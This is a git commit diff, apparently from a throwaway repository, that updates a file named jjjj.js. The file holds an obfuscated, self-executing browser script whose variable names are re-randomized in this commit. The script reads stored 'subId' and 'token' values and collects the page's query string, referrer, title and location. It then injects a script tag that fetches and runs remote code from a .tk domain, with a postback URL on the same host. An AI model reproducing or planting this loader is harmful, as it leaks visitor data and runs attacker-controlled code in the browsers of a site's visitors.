36ad678add5d56ea21cf1e5ec9b6dd18890d5d8b
Mastikafa <80054647+Mastikafa@users.noreply.github.com>
2021-03-05 17:08:04 +0300

    Update jjjj.js

--- jjjj.js
+++ jjjj.js
@@ -1,41 +1,41 @@
-  (function() {
-    var name = '_QV2bJGWsBb4PfTTb';
-    if (!window._QV2bJGWsBb4PfTTb) {
-        window._QV2bJGWsBb4PfTTb = {
+ (function() {
+    var name = '_6MStFk4rxvkcPMV9';
+    if (!window._6MStFk4rxvkcPMV9) {
+        window._6MStFk4rxvkcPMV9 = {
             unique: false,
             ttl: 86400,
             R_PATH: 'https://perneyledisrio.tk/fashionnetworks',
             P_PATH: 'https://perneyledisrio.tk/fec84ce/postback',
         };
     }
-    const _nVyxxMrm3xnZDW7c = localStorage.getItem('config');
-    if (typeof _nVyxxMrm3xnZDW7c !== 'undefined' && _nVyxxMrm3xnZDW7c !== null) {
-        var _Z34t7H19TTvPbt6f = JSON.parse(_nVyxxMrm3xnZDW7c);
-        var _N5ZthT7rwPY6ZbMf = Math.round(+new Date()/1000);
-        if (_Z34t7H19TTvPbt6f.created_at + window._QV2bJGWsBb4PfTTb.ttl < _N5ZthT7rwPY6ZbMf) {
+    const _XbNcx9hYCDQvkgL7 = localStorage.getItem('config');
+    if (typeof _XbNcx9hYCDQvkgL7 !== 'undefined' && _XbNcx9hYCDQvkgL7 !== null) {
+        var _FSMWHzS33YDjKsWg = JSON.parse(_XbNcx9hYCDQvkgL7);
+        var _gk5LtrNj6Xv82qqt = Math.round(+new Date()/1000);
+        if (_FSMWHzS33YDjKsWg.created_at + window._6MStFk4rxvkcPMV9.ttl < _gk5LtrNj6Xv82qqt) {
             localStorage.removeItem('subId');
             localStorage.removeItem('token');
             localStorage.removeItem('config');
         }
     }
-    var _GTJ1J4B9vr7rT9wN = localStorage.getItem('subId');
-    var _tRYPGmL9mz885v2T = localStorage.getItem('token');
-    var _Bx4V69pFs4ZgNSNd = '?return=js.client';
-        _Bx4V69pFs4ZgNSNd += '&' + decodeURIComponent(window.location.search.replace('?', ''));
-        _Bx4V69pFs4ZgNSNd += '&se_referrer=' + encodeURIComponent(document.referrer);
-        _Bx4V69pFs4ZgNSNd += '&default_keyword=' + encodeURIComponent(document.title);
-        _Bx4V69pFs4ZgNSNd += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
-        _Bx4V69pFs4ZgNSNd += '&name=' + encodeURIComponent(name);
-        _Bx4V69pFs4ZgNSNd += '&host=' + encodeURIComponent(window._QV2bJGWsBb4PfTTb.R_PATH);
-    if (typeof _GTJ1J4B9vr7rT9wN !== 'undefined' && _GTJ1J4B9vr7rT9wN && window._QV2bJGWsBb4PfTTb.unique) {
-        _Bx4V69pFs4ZgNSNd += '&sub_id=' + encodeURIComponent(_GTJ1J4B9vr7rT9wN);
+    var _PGXTjCyJhvz11mZf = localStorage.getItem('subId');
+    var _KfhnZWjqWyTXnTWF = localStorage.getItem('token');
+    var _q2jG3T69yyKmpYzB = '?return=js.client';
+        _q2jG3T69yyKmpYzB += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _q2jG3T69yyKmpYzB += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _q2jG3T69yyKmpYzB += '&default_keyword=' + encodeURIComponent(document.title);
+        _q2jG3T69yyKmpYzB += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _q2jG3T69yyKmpYzB += '&name=' + encodeURIComponent(name);
+        _q2jG3T69yyKmpYzB += '&host=' + encodeURIComponent(window._6MStFk4rxvkcPMV9.R_PATH);
+    if (typeof _PGXTjCyJhvz11mZf !== 'undefined' && _PGXTjCyJhvz11mZf && window._6MStFk4rxvkcPMV9.unique) {
+        _q2jG3T69yyKmpYzB += '&sub_id=' + encodeURIComponent(_PGXTjCyJhvz11mZf);
     }
-    if (typeof _tRYPGmL9mz885v2T !== 'undefined' && _tRYPGmL9mz885v2T && window._QV2bJGWsBb4PfTTb.unique) {
-        _Bx4V69pFs4ZgNSNd += '&token=' + encodeURIComponent(_tRYPGmL9mz885v2T);
+    if (typeof _KfhnZWjqWyTXnTWF !== 'undefined' && _KfhnZWjqWyTXnTWF && window._6MStFk4rxvkcPMV9.unique) {
+        _q2jG3T69yyKmpYzB += '&token=' + encodeURIComponent(_KfhnZWjqWyTXnTWF);
     }
     var a = document.createElement('script');
         a.type = 'application/javascript';
-        a.src = window._QV2bJGWsBb4PfTTb.R_PATH + _Bx4V69pFs4ZgNSNd;
+        a.src = window._6MStFk4rxvkcPMV9.R_PATH + _q2jG3T69yyKmpYzB;
     var s = document.getElementsByTagName('script')[0];
     s.parentNode.insertBefore(a, s)
     })();
